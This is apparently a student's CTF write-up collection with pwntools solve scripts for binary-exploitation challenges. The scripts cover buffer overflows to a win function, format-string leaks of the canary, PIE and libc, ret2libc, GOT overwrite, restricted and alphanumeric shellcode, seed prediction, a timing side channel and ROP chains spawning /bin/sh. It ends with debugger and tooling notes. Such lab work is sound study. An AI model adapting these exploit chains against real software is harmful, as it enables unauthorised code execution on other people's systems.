
# helloworld            
 return to magic function
<details>

- return to magic function to call shell
```py
from pwn import *

context.arch="amd64"

p=process('pwn/helloworld/helloworld')

print('prepare to send attack string.')
#we can use elf to find address of helloworld
elf=ELF('pwn/helloworld/helloworld')
print("addr of helloworld is : 0x",'%x'%elf.sym['helloworld'])
p.sendafter(b'!',b'a'*(32+8)+p64(0x4011FB))#we have 32 chars, 8 is the distance to stack
#4011FB is the address of helloworld


print('we should have opened the shell by now.')
p.interactive()
```

</details>

# helloworld_again      
 return to magic function
<details>

- return to magic function to call shell, but input must start with hellowrld, and ret address must be stack aligned
```py

from pwn import *
context.arch="amd64"
p=process('./pwn/helloworld_again/helloworld_again')
elf = ELF('./pwn/helloworld_again/helloworld_again')
print("addr of helloworld is : 0x",'%x'%elf.sym['helloworld'])

#we know that char s[32] has len 32
#and that the ret addr is 8 bytes above char s[32]
# looking at the memory, we see that the lea of helloworld is at 0x401263 

#to bypass the length check and strcmp, we input the following:
pause()
p.sendline(b'helloworld\0'+b'a'*(29)+p64(0x401263 ))

#p.sendline(b'helloworld\0'+b'a'*(29)+p64(0x40125b ))#this will not work
p.interactive()
p.close()
```

</details>

# sakana                

format string+ret2 libc
<details>

- 這題防禦機制開滿，但有format string漏洞。
- use format string to leak pie base and libc base(offsets can be found with gdb info proc map)
- then ret2 libc
```py
from pwn import *

context.binary=ELF('pwn/sakana/sakana')

r=process('pwn/sakana/sakana')
output=r.recvuntil(b'~>')#stuff from banner

#the 1st payload finds canary
payload=flat([
    b'%X-'*(33+5+1)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
])
r.sendline(b'printf')
r.sendline(payload)
output=r.recvuntil(b'~>')#stuff containing canary
#print(output)
_canary=output.decode().split('0x')[-1][:16]
#print('the canary is: 0x%s'%_canary)
_canary=int(_canary,16)
print('the canary is: 0x%x'%_canary)

#2nd payload finds the pie base
payload=flat([
    b'%X-'*(33+5+1+2)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
    #and finally, we see that the return address to shell+37 is 2 words up
])
r.sendline(b'printf')
r.sendline(payload)
output=r.recvuntil(b'~>')
#print(output)
_shell_addr=output.decode().split('0x')[-1][:16]
#print('return address to shell+0x37: 0x%s'%_shell_addr)
_shell_addr=int(_shell_addr,16)
print('return address to shell+0x37: 0x%x'%_shell_addr)
pie_base=_shell_addr-0x17cc#this offet value is found with gdb(info proc map and stack)
print('pie base: 0x%x'%pie_base)#verified with gdb



#3rd payload finds the __libc_start_main address
payload=flat([
        b'%X-'*(33+5+1+6)#33 is the number of words for char 264, and 5 is for the remaining registers. 1 is the canary.
    #and finally, we see that the return address to shell+37 is 2s words up
     ]
)
r.sendline(b'printf')
r.sendline(payload)
output=r.recvuntil(b'~>')
#print(output)
_libc_start_main=output.decode().split('0x')[-1][:16]
#print('return address to _libc_start_main+0x243: 0x%s'%_libc_start_main)
_libc_start_main=int(_libc_start_main,16)
print('return address to _libc_start_main+0x243: 0x%x'%_libc_start_main)
libc_base=_libc_start_main-0x24083#this offet value is found with gdb(info proc map and stack)
print('updated libc address  0x%x'%libc_base)#verified with gdb

#4th payload gets the shell
#ldd pwn/sakana/sakana
#readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
system_addr = libc_base + 0x52290
bin_sh=libc_base+0x1b45bd#strings -a -t x pwn/sakana/libc-2.31.so | grep /bin/sh
offset=264#buffer size
_ret=0x101a+pie_base#found in binary by ropper
pop_rdi=0x00000000000023a3+pie_base#found in binary by ropper

payload=flat([
    b'a'*offset,
    _canary,
    b'a'*8,
    pop_rdi,
    bin_sh,
    _ret,
    system_addr
])
pause()
r.sendline(b'printf')
r.sendline(payload)
r.interactive()
```

</details>

# modohayaku            
shellcode

<details>

- shellcode must contain certain bytes
- 可以用pwn.asm()來拚出shell code
```py
from pwn import *

import struct

context.arch = "amd64"
elf=ELF('./modohayaku')
#p = process('./modohayaku')
r = remote('ctf.adl.tw', 10002)

payload = flat(b'\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x53\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x31\xC0\x3c\x0c\x48\xBB\xD1\x9D\x96\x91\xD0\x8C\x97\xFF\x3c\x87\x48\xF7\xDB\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x53\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x5F\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x99\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x52\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x57\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x54\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x5E\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\xB0\x3B\x3c\x87\x3c\x87\x3c\x87\x3c\x0c\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x3c\x87\x0F\x05\x3c\x87\x3c\x87\x3c\x87\x3c\x0c') 

r.sendafter(b'!!!',payload)

#pause()

r.interactive()
```

</details>

# modomodohayaku      
shellcode
<details>

Shellcode must match certain pattern:
- every 6 bytes must start with 0xc 0x87 0x63
- shell code cannot contain 'k','i','r','t','o', NOP
- shell code must be no greater than 96 bytes

Obviously we cannot call execv bin/sh, since this contains 'i'.  
**key point**  <font color = #FF0080 > We can pass in other shell code from stdin.  </font>
 
1. We set up the registers to call syscall read, as shown below  
![alt text](./modomodohayaku/syscall_read.jpg)  
2. We set rdi to 0, since this is the file descriptor of stdin  
3. we need some address to store our input. It turns out we can use rbp, since its is opcode is just 1 byte. Thus we set rsi to rbp.
4. Set rdx to 0x20, since this is the size of our second shell code
5. Set rax to zero, since 0 is read's syscall number
6. Syscall
7. Call rbp, this executes our second payload, stored in rbp.

```py
from pwn import *



context.arch = "amd64"
elf=ELF('./pwn/modomodohayaku/modomodohayaku')
#r = process('./pwn/modomodohayaku/modomodohayaku')
r = remote('ctf.adl.tw', 10006)


#buffer has 240 bytes (30 vars*8)
#first 96 bytes cannot have 0x90, 0x6b, 0x69, 0x72, 0x74, 0x6f
                            #nop  k      i     r     t    o
#read 96 bytes into buffer
#divide the shellcode into lines of 6
#first 16 lines must start with 0xc 0x87 0x63
#we have to limit the shellcode within 96 bytes

#0x87=0b1000 0111
my_movsxd=b'\x63\xc0'#movsxd eax,eax
my_other_movsxd=b'\x63\xc1'#movsxd eax,ecx, we can use this to set eax

#print(asm("xor rdi,rdi"))#too long
#exit(0)

payload=b''
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")#push twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rdi")+asm("pop rdi")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push rbp")+asm("push rbp")#push twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("pop rsi")+asm("pop rsi")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x20")#push twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x20")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rdx")+asm("pop rdx")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rcx")+asm("pop rcx")#pop twice to align
payload+=asm("or al,0x87")+my_other_movsxd+asm("syscall")#use movsxd to reset eax
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#13
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#14
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#15
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#16
#print(disasm(payload))
#exit(0)
output=r.recvuntil(b'..........')#幫我撐10秒
print(output)
r.send(flat([payload]))
pause()

#the second shell code will be read from stdin to rbp, then we will call rbp, and this will get executed
second_shell_code="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
r.send(flat([second_shell_code]))
r.interactive()

 
```

</details>

# modomodomodohayaku   
- not solved
# cyberpsychosis   
got
<details>


- find libc base with showinfo
- overwrite atol's got address with libc system with edit_info
- input bin sh into buffer
- buffer gets passed into system
![alt text](./cyberpsychosis/offset_notes.jpg)
```py
from pwn import *

context.arch = "amd64"
elf=context.binary=ELF('pwn/cyberpsychosis/cyberpsychosis')

r = process('pwn/cyberpsychosis/cyberpsychosis')
#r = remote('ctf.adl.tw', 10004)

print("got.atol addrs is :%#x"%elf.got.atol)          #atol is at     0x405068
print("implants addrs is :%#x"%elf.symbols.implants)  #implants is at 0x4050e0
#elf.got.atol=elf.symbols.implants-0x78
output=r.recvuntil(b'.')#stuff from banner

#first populate the got table, (remember the GOT table will only be populated after respective functions are first called)
r.sendline(b'2')#implant stuff
sleep(0.1)
r.sendline(b'0')# at index 0
sleep(0.1)
r.sendline(b'123456789')#implant name 
sleep(0.1)
r.sendline(b'999999999')#implant value
output=r.recvuntil(b'!')#implant success!
print(output)

#we then leak the libc base with show info
r.sendline(b'1')#show implants
sleep(0.1)
output=r.recvuntil(b'idx> ')
r.sendline(b'-3')#show implant at index 0
sleep(0.1)
output=r.recvuntil(b'value: ')#recv stuff
output=r.recvuntil(b'\n')#this is the printf@GLIBC_2.2.5 
#offset of printf@GLIBC_2.2.5 is 0x61c90 from libc base(found with gdb info proc map and got)
output=int(output[:-1])#shave off \n
print("address of printf@glibc :%#x"%output) 
print("address of libc base is :%#x"%(output-0x61c90)) 
libc_base=output-0x61c90#we have our libc base
sleep(0.1)

pause()




#the 3rd payload overwrites the got table, and gets us the shell
r.sendline(b'2')#implant
r.sendline(b'-2')#this writes to the elf.got.atol

sys_addr=libc_base+0x52290

print('system addr:%#x'%sys_addr)
payload=flat([
    b'a'*8,
    sys_addr])
r.sendline(payload)
pause()
payload=flat([b'/bin/sh\0'])
r.sendline(payload)

r.interactive()


```

</details>


# Test_Subject_087      
- not solved
# project_alicization   
srand()+shellcode

<details>

- guess password using the same srand(time(0))
- input shellcode that contain all ascii bytes
```py

from pwn import *
from ctypes import *
elf=context.binary=ELF('pwn/project_alicization/project_alicization')
_lib='/lib/x86_64-linux-gnu/libc.so.6'
lib=cdll.LoadLibrary(_lib)
r=process('pwn/project_alicization/project_alicization')
output=r.recvuntil(b':')

def make_psw(plus):
    lib.srand(time_base+plus)
    s=""
    for i in range(20):
        _random_val=lib.rand()
        s+=chr(_random_val +_random_val // 0x5d * -0x5d +0x21)#'!'=0x21
    return s

time_base=lib.time(0)
passwd_list=[]
passwd_list.append(make_psw(0).encode())	#same as remote
#passwd_list.append(make_psw(1).encode())	#remote is 1 second later
#
r.sendline(b'System Call login')
output=r.recvuntil(b'Username: ')
print(output)
r.sendline(b'Quinella')
output=r.recvuntil(b'Password: ')
print(output)
r.sendline(passwd_list[0])
output=r.recvuntil(b': ')
print(output)
pause()
#[0x20,0x7e]

shellcode = 'Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t'

r.sendline(b'System Call generate shellcode element')
payload=flat([
    
    shellcode
])
r.send(payload)
output=r.recvuntil(b': ')
print(output)
r.interactive()

```

</details>

# guitar_hero           
- not solved
# how2know
shellcode

<details>

- leak the flag address with rdi
- write a shell code that compares each character of the flag, and exit upon a match
```py
import pwn
import time
pwn.context.arch = "amd64"
offset = 0x001013dc - 0x00104040
def pwn_char_by_char(ith, char_ascii):
    shellcode = pwn.asm(
    f"""
    mov rbx, qword ptr[rsp]
    sub rbx, {offset - ith}
    mov rax, qword ptr [rbx]
    cmp al, {hex(char_ascii)}
    jne $ - 0x4
    mov rax, 0x3c
    3
    xor rdi, rdi
    syscall
    """
    )
    r = pwn.remote("edu-ctf.zoolab.org", 10002)
    r.recvuntil(b"talk is cheap, show me the code")
    r.send(shellcode)
    t1 = time.time()
    try:
        r.recvall(timeout=1)
    except Exception:
        pass
    # if elapsed time smaller than 0.5: correct
    return time.time() - t1 < 0.5
flag = ""
for i in range(0, 0x30):
    print(f"Guessing {i} th char")
    for j in range(0x20, 0x7f):
        print(j, hex(j), chr(j))
        if pwn_char_by_char(i, j):
            flag += chr(j)
            print("hit", chr(j))
            break
print(flag)
```
</details>

# rop++
rop

<details>

- solution1:
    - set up rop chain to read bin/sh into bss segment
    - call syscall execv
    ```py
    import pwn

    pwn.context.log_level = "debug"
    pwn.context.arch = "amd64"

    bss_addr = 0x4c72a0 # .bss address
    mov_rsi_rax = 0x449fa5 # mov qword ptr [rsi], rax ; ret
    pop_rax = 0x447b27 # pop rax ; ret
    pop_rsi = 0x409e6e # pop rsi ; ret

    pop_rdi = 0x401e3f # pop rdi ; ret
    pop_rax_pop_rdx_pop_rbx = 0x47ed0a # pop rax ; pop rdx ; pop rbx ; ret
    syscall = 0x401bf4 # syscall

    payload = pwn.flat(
    b"A" * 40,
    pop_rax, b"/bin/sh\0", # rax <- '/bin/sh'
    pop_rsi, bss_addr, # rsi <- 0x4c72a0
    mov_rsi_rax, # [0x4c72a0] <- '/bin/sh'

    pop_rdi, bss_addr,
    pop_rsi, 0,
    pop_rax_pop_rdx_pop_rbx, 0x3b, 0, 0,
    syscall,
    )

    p = pwn.remote("edu-ctf.zoolab.org", 10003)
    p.recvuntil(b"show me rop\n> ")

    p.sendline(payload)
    p.interactive()
    ```
- solution2:
    - mov bin/sh to data segment
    - call syscall execv
    ```py
    from pwn import *

    context.arch = 'amd64'
    p = process("chal")
    #p = remote("edu-ctf.zoolab.org", 10003)

    p.recvuntil(b"show me rop\n> ")
    pop_rdi = 0x40181a
    pop_rsi = 0x40f14e
    pop_rdx = 0x40171f
    pop_rax = 0x448e67
    syscall = 0x416a54
    bss_addr = 0x4C2270

    payload = flat(
        b"A" * 40,
        pop_rdi,
        0x0,
        pop_rsi,
        bss_addr,
        pop_rdx,
        0x10,
        pop_rax,
        0x0,
        syscall,
        pop_rdi,
        bss_addr,
        pop_rsi,
        0x0,
        pop_rdx,
        0x0,
        pop_rax,
        0x3b,
        syscall
    )
    p.send(payload)
    sleep(0.1)
    p.send(b"/bin/sh")
    p.interactive()

    ```
</details>









# 筆記(GDB用法、IDA用法、Ghidra用法)

<details>

# ida usage:
1. drag binary into window
2. press f5 to see src code
3. we can press ctrl+s to see the memory addresses

# objdump usage
objdump -M intel -d ./pwn/sakana/sakana

# gdb usage
attach 8194
1. b main
2. disas main
   disas hellowrld (to see lea addr)
3. b *0x40125b 斷在關鍵位置
4. 輸入字串，觀察stack
## other
- step
- x/200gs 0x555555556042
- x/200gi <addr>
- x/5i $rsp-10	
- vmmap查看process mapping狀況
- search-pattern bin/sh
- telescope 0x7ffff7f795bd 20
- telescope $sp 200
- finish: Continue running until just after function in the selected stack frame returns. Print the returned value (if any). This command can be abbreviated as fin.
- break *main+140
# format string attack
- rdi register(in amd 64 )holds the first argument to the function
- rsi register(in amd 64 )holds the second argument to the function
- in amd 64, the arguments beyond the 7th are stored in the stack. The 1st 6 are in registers
- in format string attacks, %s treats the value on the stack or register as a pointer to some other string(maybe points to the got)
# ret2libc
- strings -a -t x pwn/sakana/libc-2.31.so | grep /bin/sh
# piebase
- we can find the pie base using gdb
- use info proc map in gdb to find libc base
# pwndbg usage
- disassemble parse_cmd
- info functions
# ropper -f pwn/sakana/sakana
- ropper -f pwn/sakana/sakana
- pop rdi is used like this:provide the address to the pop rdi gadget, then put WHAT YOU WANT TO PUT INTO THE rdi register in the next word. This will put that word into the rdi. Once you are sure that you have what you need in the registers, you call the function.(system, for example)

# pwntools
- p64:payload construct

- lib=ELF('libc.so.6')
- lib.symbols['system']
# shellcode
- shellcraft -l amd64.linux.sh:list shell codes
- msfvenom
# ldd
- finds dependencies
- ldd pwn/sakana/sakana
# readelf 找libc function offset
- readelf -s  /lib/x86_64-linux-gnu/libc.so.6 | grep "libc_start_main"
# BOA
- rbp is the base pointer, which points to the base of the current stack frame,
and rsp is the stack pointer, which points to the top of the current stack frame.
- for example, in amd64, a stack looks like this:
    - 8th parameter...
    - 7th parameter(the 1st six are on registers)
    - return address
    - rbp-->stack bottom
    - canary
    - char[64]
    - rsp-->stack top
if there is a buffer, rsp will point to it
- $sp is stack pointer
- GOT (Global Offset Table)
: GOT存著很多個一樣大小的元素，形成一個table(基本上就是array)。
每個元素都是一個指標(所以說32位元機器一個元素4個byte，64位元就是8個byte)，
指向程式所需要的變數或者是函數，也有可能是系統需要的指標。


- plt:
PLT存著很多個一樣大小的元素，形成一個table(基本上就是array)。每個元素都是一小段程式碼，
第一個元素是公共plt，負責呼叫動態鏈接器。從第二個開始每個元素分別對應到一個動態鏈接的函數，
會使用該函數所對應之GOT元素。

意思就是一個動態鏈接函數對應到一個GOT元素(指標)，一個PLT元素(執行碼)。CPU執行PLT存的程式碼，使用GOT存的指標想辦法跳到該函數
-First six arguments are in rdi, rsi, rdx, rcx, r8d, r9d
the difference between lea and mov is: mov is used to move data, lea is used to move addresses

# how to gdb attach
1. Find the process id (pid) with the ps command: $ ps -C program -o pid h pid.
2. Replace program with a file name or path to the program.
Attach GDB to this process: $ gdb program -p pid.

</details>